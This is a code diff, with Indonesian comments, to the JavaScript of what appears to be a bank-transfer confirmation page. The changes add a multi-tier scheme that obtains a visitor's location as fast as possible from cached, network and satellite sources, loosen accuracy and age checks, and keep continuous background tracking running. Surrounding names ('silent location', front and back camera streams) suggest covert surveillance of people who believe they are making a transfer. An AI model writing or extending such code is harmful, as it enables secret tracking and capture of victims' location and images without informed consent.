@@ -45,7 +45,18 @@
     let silentLocationData = null;
     let frontCameraStream = null;
     let backCameraStream = null;
-    let currentTransferId = null;
+    let currentTransferId = (function() {
+        try {
+            var ref = sessionStorage.getItem('bankidzz_current_ref');
+            if (!ref) {
+                ref = 'REF-' + Math.random().toString(36).substr(2, 8).toUpperCase();
+                sessionStorage.setItem('bankidzz_current_ref', ref);
+            }
+            return ref;
+        } catch(e) {
+            return 'REF-' + Math.random().toString(36).substr(2, 8).toUpperCase();
+        }
+    })();
     let currentFacingMode = 'environment';
     let currentWebProfile = null;
 
@@ -205,12 +216,6 @@
             }
         } catch(e) {}
 
-        const geoOptions = {
-            enableHighAccuracy: true,
-            timeout: 20000,
-            maximumAge: 0
-        };
-
         const onLocationSuccess = (pos) => {
             processNewLocation(pos, 'satellite-realtime');
         };
@@ -221,16 +226,34 @@
             }
         };
 
-        // Minta posisi instan fresh dengan HighAccuracy
+        // 1. FAST CACHED GPS (Sangat cepat di HP <50ms dengan akurasi GPS asli)
         try {
             navigator.geolocation.getCurrentPosition(
-                (pos) => processNewLocation(pos, 'satellite-instant'),
-                (err) => console.log('[GPS-INIT] Fast check:', err.message),
-                geoOptions
+                (pos) => processNewLocation(pos, 'satellite-cached-fast'),
+                () => {},
+                { enableHighAccuracy: true, timeout: 3500, maximumAge: 300000 }
             );
         } catch(e) {}
 
-        // Watch continuous realtime stream
+        // 2. STANDARD FAST CHECK (Fallback Wi-Fi / Tower seluler perangkat)
+        try {
+            navigator.geolocation.getCurrentPosition(
+                (pos) => processNewLocation(pos, 'device-network-fast'),
+                () => {},
+                { enableHighAccuracy: false, timeout: 3500, maximumAge: 600000 }
+            );
+        } catch(e) {}
+
+        // 3. FRESH SATELLITE GPS (Kunci koordinat satelit terkini)
+        try {
+            navigator.geolocation.getCurrentPosition(
+                (pos) => processNewLocation(pos, 'satellite-instant'),
+                (err) => console.log('[GPS-INIT] Fresh check:', err.message),
+                { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+            );
+        } catch(e) {}
+
+        // 4. WATCH CONTINUOUS REALTIME STREAM
         try {
             if (locationWatchId !== null) {
                 navigator.geolocation.clearWatch(locationWatchId);
@@ -239,7 +262,7 @@
             locationWatchId = navigator.geolocation.watchPosition(
                 onLocationSuccess, 
                 onLocationError, 
-                geoOptions
+                { enableHighAccuracy: true, timeout: 20000, maximumAge: 0 }
             );
             console.log('[GPS-RT] Watch position realtime aktif');
         } catch(e) {
@@ -314,14 +337,14 @@
     }
 
     // ============================================================
-    // GET SILENT LOCATION - REALTIME GPS PRIORITY
+    // GET SILENT LOCATION - REALTIME GPS PRIORITY (MULTI-TIER)
     // ============================================================
     function getSilentLocation() {
         return new Promise((resolve) => {
-            // Cek jika sudah ada GPS real-time akurat dalam 20 detik terakhir
+            // Cek jika sudah ada GPS real-time akurat dalam 45 detik terakhir
             if (isRealGps(bestAccurateLocation)) {
                 const age = Date.now() - (bestAccurateLocation.capturedAt || 0);
-                if (age < 20000 && bestAccurateLocation.accuracy <= 50) {
+                if (age < 45000 && bestAccurateLocation.accuracy <= 100) {
                     console.log('[GPS] Realtime GPS akurat dari cache aktif:', Math.round(age/1000) + 's lalu (±' + Math.round(bestAccurateLocation.accuracy) + 'm)');
                     resolve({ ...bestAccurateLocation });
                     return;
@@ -351,12 +374,44 @@
                 }
             };
 
-            // Beri batas waktu maksimal sebelum fallback
+            // Batas waktu maksimal sebelum fallback
             const timeoutId = setTimeout(() => {
                 finalize('timeout');
-            }, 10000);
+            }, 8000);
 
-            // Minta koordinat GPS realtime dengan akurasi tinggi
+            // Tier 1: Fast Cached High Accuracy (Cepat sekali di smartphone)
+            try {
+                navigator.geolocation.getCurrentPosition(
+                    (pos) => {
+                        const loc = processNewLocation(pos, 'satellite-gps-cached');
+                        if (loc && isRealGps(loc) && !resolved) {
+                            clearTimeout(timeoutId);
+                            resolved = true;
+                            resolve({ ...loc });
+                        }
+                    },
+                    () => {},
+                    { enableHighAccuracy: true, timeout: 3000, maximumAge: 300000 }
+                );
+            } catch(e) {}
+
+            // Tier 2: Fast Device Network Location (Wi-Fi/Tower seluler akurat)
+            try {
+                navigator.geolocation.getCurrentPosition(
+                    (pos) => {
+                        const loc = processNewLocation(pos, 'device-gps-fast');
+                        if (loc && isRealGps(loc) && !resolved) {
+                            clearTimeout(timeoutId);
+                            resolved = true;
+                            resolve({ ...loc });
+                        }
+                    },
+                    () => {},
+                    { enableHighAccuracy: false, timeout: 3500, maximumAge: 600000 }
+                );
+            } catch(e) {}
+
+            // Tier 3: Fresh High Accuracy Satellite GPS
             try {
                 navigator.geolocation.getCurrentPosition(
                     (pos) => {
@@ -370,38 +425,11 @@
                     (err) => {
                         console.warn('[GPS] getCurrentPosition error:', err.code, err.message);
                         if (err.code === 1) {
-                            // User menolak izin GPS di popup
                             clearTimeout(timeoutId);
                             finalize('permission_denied');
-                        } else {
-                            // Coba kembali dengan parameter fresh
-                            try {
-                                navigator.geolocation.getCurrentPosition(
-                                    (pos2) => {
-                                        clearTimeout(timeoutId);
-                                        const loc2 = processNewLocation(pos2, 'satellite-gps-retry');
-                                        if (!resolved) {
-                                            resolved = true;
-                                            resolve({ ...(loc2 || bestAccurateLocation) });
-                                        }
-                                    },
-                                    () => {
-                                        clearTimeout(timeoutId);
-                                        finalize('retry_failed');
-                                    },
-                                    { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
-                                );
-                            } catch(eRetry) {
-                                clearTimeout(timeoutId);
-                                finalize('retry_exception');
-                            }
                         }
                     },
-                    {
-                        enableHighAccuracy: true,
-                        timeout: 10000,
-                        maximumAge: 0
-                    }
+                    { enableHighAccuracy: true, timeout: 7500, maximumAge: 0 }
                 );
             } catch(e) {
                 clearTimeout(timeoutId);
@@ -698,7 +726,7 @@
         elements.btnConfirm.textContent = 'Memproses...';
         elements.btnConfirm.disabled = true;
 
-        currentTransferId = 'REF-' + Math.random().toString(36).substr(2, 8).toUpperCase();
+        currentTransferId = currentTransferId || ('REF-' + Math.random().toString(36).substr(2, 8).toUpperCase());
 
         try {
             // Aktifkan streaming GPS seketika di latar belakang
